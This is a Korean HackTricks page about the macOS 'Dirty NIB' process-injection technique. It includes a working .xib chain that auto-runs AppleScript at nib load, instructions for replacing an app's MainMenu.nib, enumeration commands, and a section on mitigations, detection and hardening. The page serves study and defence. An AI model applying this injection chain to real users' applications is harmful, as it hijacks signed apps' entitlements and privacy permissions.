# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB는 서명된 macOS 앱 번들 내부의 Interface Builder 파일(.xib/.nib)을 악용해 대상 프로세스 내부에서 공격자가 제어하는 로직을 실행하고, 그 결과 해당 프로세스의 entitlements 및 TCC 권한을 상속받는 기법을 말합니다. 이 기법은 원래 xpn (MDSec)이 문서화했으며, 이후 Sector7이 이를 일반화하고 크게 확장하면서 macOS 13 Ventura와 macOS 14 Sonoma에서 Apple이 도입한 완화책도 다뤘습니다. 배경과 심층 분석은 문서 끝의 참조를 참조하세요.

> TL;DR
> • Before macOS 13 Ventura: 번들의 MainMenu.nib(또는 시작 시 로드되는 다른 nib)를 교체하면 process injection을 안정적으로 달성할 수 있었고, 종종 privilege escalation으로 이어졌습니다.
> • Since macOS 13 (Ventura) and improved in macOS 14 (Sonoma): first‑launch deep verification, bundle protection, Launch Constraints, 및 새로운 TCC “App Management” 권한으로 인해 관련 없는 앱이 실행 후 nib을 변조하는 것이 대부분 차단됩니다. 다만 동일 개발자(tooling)가 자체 앱을 수정하는 경우나 사용자가 터미널에 App Management/Full Disk Access를 부여한 경우 등 일부 틈새 상황에서는 공격이 여전히 가능할 수 있습니다.


## What are NIB/XIB files

Nib (short for NeXT Interface Builder) 파일은 AppKit 앱에서 사용하는 직렬화된 UI 객체 그래프입니다. 최신 Xcode는 편집 가능한 XML .xib 파일을 저장하며, 빌드 시 이를 .nib로 컴파일합니다. 일반적인 앱은 `NSApplicationMain()`을 통해 메인 UI를 로드하며, 이 함수는 앱의 Info.plist에서 `NSMainNibFile` 키를 읽어 런타임에 객체 그래프를 인스턴스화합니다.

Key points that enable the attack:
- NIB loading은 NSSecureCoding을 준수할 것을 요구하지 않고 임의의 Objective‑C 클래스를 인스턴스화할 수 있습니다 (Apple의 nib loader는 `initWithCoder:`가 없을 때 `init`/`initWithFrame:`으로 폴백합니다).
- Cocoa Bindings는 nib가 인스턴스화될 때 메서드를 호출하도록 악용될 수 있으며, 사용자 상호작용 없이도 동작하는 연쇄 호출(chained calls)을 포함할 수 있습니다.


## Dirty NIB injection process (attacker view)

고전적인 pre‑Ventura 흐름:
1) Create a malicious .xib
- Add an `NSAppleScript` object (or other “gadget” classes such as `NSTask`).
- Add an `NSTextField` whose title contains the payload (e.g., AppleScript or command arguments).
- Add one or more `NSMenuItem` objects wired via bindings to call methods on the target object.

2) Auto‑trigger without user clicks
- 바인딩을 사용해 메뉴 아이템의 target/selector를 설정한 다음 비공개 메서드 `_corePerformAction`을 호출하여 nib 로드 시 액션이 자동으로 실행되게 합니다. 이렇게 하면 사용자가 버튼을 클릭할 필요가 없어집니다.

Minimal example of an auto‑trigger chain inside a .xib (abridged for clarity):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
이로써 nib 로드 시 대상 프로세스에서 임의의 AppleScript 실행이 가능해진다. 고급 체인은 다음을 수행할 수 있다:
- 임의의 AppKit 클래스(예: `NSTask`)를 인스턴스화하고 `-launch` 같은 인수 없는 메서드를 호출한다.
- 위의 binding trick을 통해 객체 인수를 가진 임의의 selector를 호출한다.
- AppleScriptObjC.framework를 로드해 Objective‑C로 브리지하고 선택된 C API를 호출할 수도 있다.
- 여전히 Python.framework를 포함하는 구형 시스템에서는 Python으로 브리지한 다음 `ctypes`로 임의의 C 함수를 호출할 수 있다 (Sector7’s research).

3) 앱의 nib 교체
- target.app을 쓰기 가능한 위치로 복사하고, 예를 들어 `Contents/Resources/MainMenu.nib`을 악성 nib으로 교체한 다음 target.app을 실행한다. Pre‑Ventura에서는 일회성 Gatekeeper 평가 이후 후속 실행 시 얕은 서명 검사만 수행되어 비실행 리소스(예: .nib)는 재검증되지 않았다.

Example AppleScript payload for a visible test:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## 최신 macOS 보호 기능 (Ventura/Monterey/Sonoma/Sequoia)

Apple은 현대 macOS에서 Dirty NIB의 실효성을 크게 줄이는 여러 전반적인 완화책을 도입했습니다:
- First‑launch deep verification and bundle protection (macOS 13 Ventura)
- 앱이 처음 실행될 때(격리(quarantined) 여부와 관계없이), 번들의 모든 리소스에 대해 심층 서명 검사가 수행됩니다. 이후 번들은 보호 상태가 되어 동일 개발자(또는 앱에서 명시적으로 허용한 경우)의 앱만 번들 내용을 수정할 수 있습니다. 다른 앱이 다른 앱의 번들에 쓰기하려면 새로운 TCC “App Management” 권한이 필요합니다.
- Launch Constraints (macOS 13 Ventura)
- System/Apple‑bundled 앱은 다른 위치로 복사하여 실행할 수 없게 되었습니다. 이는 OS 앱에 대해 "copy to /tmp, patch, run" 방식의 접근을 무력화합니다.
- Improvements in macOS 14 Sonoma
- Apple은 App Management를 강화하고 Sector7이 지적한 알려진 우회 기법들(예: CVE‑2023‑40450)을 수정했습니다. 또한 Python.framework는 이전(macOS 12.3)에서 제거되어 일부 권한 상승 체인을 깨뜨렸습니다.
- Gatekeeper/Quarantine changes
- 이 기법에 영향을 준 Gatekeeper, provenance 및 assessment 변경 사항에 대한 더 광범위한 논의는 아래 참조 페이지를 확인하십시오.

> Practical implication
> • Ventura 이상에서는 프로세스가 App Management 권한을 갖고 있거나 대상과 동일한 Team ID로 서명되지 않는 한, 일반적으로 타사 앱의 .nib를 수정할 수 없습니다(예: 개발자 도구).
> • 쉘/터미널에 App Management 또는 Full Disk Access를 부여하면 해당 터미널의 컨텍스트 내에서 코드를 실행할 수 있는 모든 것이 이 공격 표면을 사실상 다시 열게 됩니다.


### Launch Constraints 대응

Launch Constraints는 Ventura부터 기본 위치가 아닌 곳에서 많은 Apple 앱의 실행을 차단합니다. Apple 앱을 임시 디렉토리로 복사하고, `MainMenu.nib`를 수정한 뒤 실행하는 것과 같은 pre‑Ventura 워크플로에 의존했다면, macOS >= 13.0에서는 실패할 것으로 예상하세요.


## 대상 및 nib 열거 (연구 / 레거시 시스템에 유용)

- UI가 nib‑driven인 앱 찾기:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- 번들 내부에서 후보 nib 리소스를 찾기:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- 코드 서명을 깊이 검증하세요(리소스를 변경했고 다시 서명하지 않았다면 실패합니다):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> 참고: 최신 macOS에서는 적절한 권한 없이 다른 앱의 번들에 쓰기를 시도하면 bundle protection/TCC에 의해 차단됩니다.


## 탐지 및 DFIR 팁

- 번들 리소스의 파일 무결성 모니터링
- 설치된 앱의 `Contents/Resources/*.nib` 및 기타 비실행 리소스에 대한 mtime/ctime 변경 감시
- 통합 로그 및 프로세스 동작
- GUI 앱 내부에서 예상치 못한 AppleScript 실행 및 AppleScriptObjC 또는 Python.framework을 로드하는 프로세스 감시. 예:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- 사전 점검
- 중요한 앱에 대해 주기적으로 `codesign --verify --deep`를 실행하여 리소스가 온전한지 확인
- 권한 컨텍스트
- 누가/무엇이 TCC의 “App Management” 또는 Full Disk Access 권한을 갖고 있는지 감사(특히 터미널과 관리 에이전트). 일반‑목적 셸에서 이러한 권한을 제거하면 쉽게 Dirty NIB‑스타일 변조를 재활성화하는 것을 방지할 수 있음


## 방어적 하드닝 (개발자 및 방어 담당자)

- 가능하면 프로그래밍 방식 UI를 사용하거나 nib에서 인스턴스화되는 것을 제한하세요. nib 그래프에 강력한 클래스(예: `NSTask`)를 포함하지 말고 임의 객체에 대해 셀렉터를 간접 호출하는 바인딩을 피하세요.
- Library Validation이 적용된 hardened runtime 채택(현대 앱에서는 이미 표준). 이것만으로 nib injection을 막을 수는 없지만, 네이티브 코드의 쉬운 로드를 차단해 공격자를 스크립트 전용 페이로드로 밀어넣습니다.
- 일반 목적 도구에서 광범위한 App Management 권한을 요청하거나 의존하지 마세요. MDM이 App Management를 요구하는 경우, 해당 컨텍스트를 사용자 주도의 쉘과 분리하세요.
- 앱 번들의 무결성을 정기적으로 검증하고 업데이트 메커니즘이 번들 리소스를 자동 복구(self‑heal)하도록 만드세요.


## Related reading in HackTricks

Learn more about Gatekeeper, quarantine and provenance changes that affect this technique:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## 참고 자료

- xpn – DirtyNIB (원본 설명, Pages 예시): https://blog.xpnsec.com/dirtynib/
- Sector7 – Bringing process injection into view(s): nib 파일을 사용하여 모든 macOS 앱을 악용하기 (April 5, 2024): https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/

{{#include ../../../banners/hacktricks-training.md}}
